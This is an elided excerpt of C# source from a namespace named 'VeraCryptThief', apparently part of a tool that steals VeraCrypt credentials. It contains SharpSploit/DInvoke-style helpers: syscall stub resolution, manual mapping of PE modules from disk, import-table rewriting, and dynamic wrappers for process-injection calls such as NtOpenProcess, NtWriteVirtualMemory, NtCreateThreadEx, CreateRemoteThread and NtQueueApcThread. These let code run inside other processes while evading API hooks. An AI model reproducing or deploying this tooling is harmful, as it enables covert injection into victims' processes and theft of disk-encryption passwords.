...
namespace VeraCryptThief
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate Boolean CloseHandle(IntPtr hProcess);

    public class DoItDynamicallyBabe
    {
        class Utilities
        {
            /// <summary>
        ...
        public class Map
        {
            ...
            public static PE.PE_MANUAL_MAP MapModuleFromDiskToSection(string DLLPath)
            {
                ...
                // Syscall NtOpenFile
                IntPtr pNtOpenProc = DynGen.GetSyscallStub("NtOpenFile");
                ...
                IntPtr pNtCreateSection = DynGen.GetSyscallStub("NtCreateSection");
                ...
                IntPtr pNtMapViewOfSection = DynGen.GetSyscallStub("NtMapViewOfSection");
                ...
                {
                    PEINFO = DynGen.GetPeMetaData(pBaseAddress),
                    ModuleBase = pBaseAddress
                };

                DoItDynamicallyBabe.DynamicWin32.CloseHandle(hFile);
            ...
            public static void RewriteModuleIAT(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                ...
                {
                    ApiSetDict = DynGen.GetApiSetMapping();
                }
                ...
                while (iid.Name != 0)
                {
                    ...
                    else
                    {
                        ...
                        IntPtr hModule = DynGen.GetLoadedModuleAddress(DllName);
                        if (hModule == IntPtr.Zero)
                        {
                            hModule = DynGen.LoadModuleFromDisk(DllName);
                            if (hModule == IntPtr.Zero)
                            {
                        ...
                        if (PEINFO.Is32Bit)
                        {
                            ...
                            for (int i = 0; true; i++)
                            {
                                ...
                                if (oft_itd.AddressOfData < 0x80000000) // !IMAGE_ORDINAL_FLAG32
                                {
                                    ...
                                    pFunc = DynGen.GetNativeExportAddress(hModule, Marshal.PtrToStringAnsi(pImpByName));
                                ...
                                else
                                {
                                    ...
                                    IntPtr pFunc = IntPtr.Zero;
                                    pFunc = DynGen.GetNativeExportAddress(hModule, (short)fOrdinal);
            ...
            {
                // Fetch PE meta data
                PE.PE_META_DATA PEINFO = DynGen.GetPeMetaData(pModule);
                ...
                IntPtr pNtAllocateVirtualMemory = DynGen.GetSyscallStub("NtAllocateVirtualMemory");
            ...
            public static PE.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule, IntPtr pImage, PE.PE_META_DATA PEINFO)
            {
                ...
                IntPtr pNtWriteVirtualMemory = DynGen.GetSyscallStub("NtWriteVirtualMemory");
...
#pragma warning restore 0618
        ...
        public class DynamicNative
        {
                ...
                IntPtr attributeList)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateThreadEx",
                    ...
                    IntPtr ClientId)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"RtlCreateUserThread",
                ...
                IntPtr FileHandle)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtCreateSection", typeof(DELEGATES.NtCreateSection), ref funcargs);
            ...
            public static Native.NTSTATUS NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
            {
                ...
                Native.NTSTATUS result = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtUnmapViewOfSection",
                ...
                uint Win32Protect)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtMapViewOfSection", typeof(DELEGATES.NtMapViewOfSection), ref funcargs);
            ...
            public static void RtlInitUnicodeString(ref Native.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
            {
                ...
                DynGen.DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
            ...
            public static Native.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Native.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
            ...
            public static void RtlZeroMemory(IntPtr Destination, int Length)
            {
                ...
                DynGen.DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
            }
            ...
            public static Native.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, Native.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static IntPtr NtOpenProcess(UInt32 ProcessId, Win32.Kernel32.ProcessAccessFlags DesiredAccess)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenProcess", typeof(DELEGATES.NtOpenProcess), ref funcargs);
            ...
            public static void NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtQueueApcThread", typeof(DELEGATES.NtQueueApcThread), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static IntPtr NtOpenThread(int TID, Win32.Kernel32.ThreadAccess DesiredAccess)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenThread", typeof(DELEGATES.NtOpenProcess), ref funcargs);
                if (retValue != Native.NTSTATUS.Success && retValue == Native.NTSTATUS.InvalidCid)
                {
                    throw new InvalidOperationException("An invalid client ID was specified.");
                }
            ...
            public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(DELEGATES.NtAllocateVirtualMemory), ref funcargs);
            ...
            public static void NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 FreeType)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtFreeVirtualMemory", typeof(DELEGATES.NtFreeVirtualMemory), ref funcargs);
                if (retValue == Native.NTSTATUS.AccessDenied)
                {
                    // STATUS_ACCESS_DENIED
                    throw new UnauthorizedAccessException("Access is denied.");
            ...
            public static string GetFilenameFromMemoryPointer(IntPtr hProc, IntPtr pMem)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtQueryVirtualMemory", typeof(DELEGATES.NtQueryVirtualMemory), ref funcargs);
            ...
            public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static IntPtr LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"LdrGetProcedureAddress", typeof(DELEGATES.LdrGetProcedureAddress), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static void RtlGetVersion(ref Native.OSVERSIONINFOEX VersionInformation)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"RtlGetVersion", typeof(DELEGATES.RtlGetVersion), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
                    throw new InvalidOperationException("Failed get procedure address, " + retValue);
                }
            ...
            public static UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, ref UInt32 NumberOfBytesToRead)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtReadVirtualMemory", typeof(DELEGATES.NtReadVirtualMemory), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            public static IntPtr NtOpenFile(ref IntPtr FileHandle, Win32.Kernel32.FileAccessFlags DesiredAccess, ref Native.OBJECT_ATTRIBUTES ObjAttr, ref Native.IO_STATUS_BLOCK IoStatusBlock, Win32.Kernel32.FileShareFlags ShareAccess, Win32.Kernel32.FileOpenFlags OpenOptions)
            {
                ...
                Native.NTSTATUS retValue = (Native.NTSTATUS)DynGen.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenFile", typeof(DELEGATES.NtOpenFile), ref funcargs);
                if (retValue != Native.NTSTATUS.Success)
                {
            ...
            /// Must be public so that they may be used with SharpSploit.Execution.DynGen.DynamicFunctionInvoke
            /// </summary>
            /// <example>
            /// 
            ...
            /// IntPtr pFunction = Execution.DynGen.GetLibraryAddress(@"ntdll.dll", "NtCreateThreadEx");
            /// 
        ...
        public class DynGen
        {
            ...
            public static void CallMappedPEModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
            {
                ...
                // Syscall NtOpenFile
                IntPtr pNtCreateThreadEx = DynGen.GetSyscallStub("NtCreateThreadEx");
            ...
            /// </summary>
            /// <author>Ruben Boonen (@FuzzySec)</author> & Am0nsec
        ...
        public static class DynamicWin32
        {
            ...
            public static IntPtr OpenProcess(Win32.Kernel32.ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId)
            {
                ...
                return (IntPtr)DynGen.DynamicAPIInvoke(@"kernel32.dll", @"OpenProcess",
                ...
                ref IntPtr lpThreadId)
            {
                ...
                IntPtr retValue = (IntPtr)DynGen.DynamicAPIInvoke(@"kernel32.dll", @"CreateRemoteThread",
            ...
            public static bool IsWow64Process(IntPtr hProcess, ref bool lpSystemInfo)
            {
                ...
                bool retVal = (bool)DynGen.DynamicAPIInvoke(@"kernel32.dll", @"IsWow64Process", typeof(Delegates.IsWow64Process), ref funcargs);
            ...
            public static bool CloseHandle(IntPtr handle)
            {
                ...
                bool retVal = (bool)DynGen.DynamicAPIInvoke(@"kernel32.dll", @"CloseHandle", typeof(CloseHandle), ref funcargs);
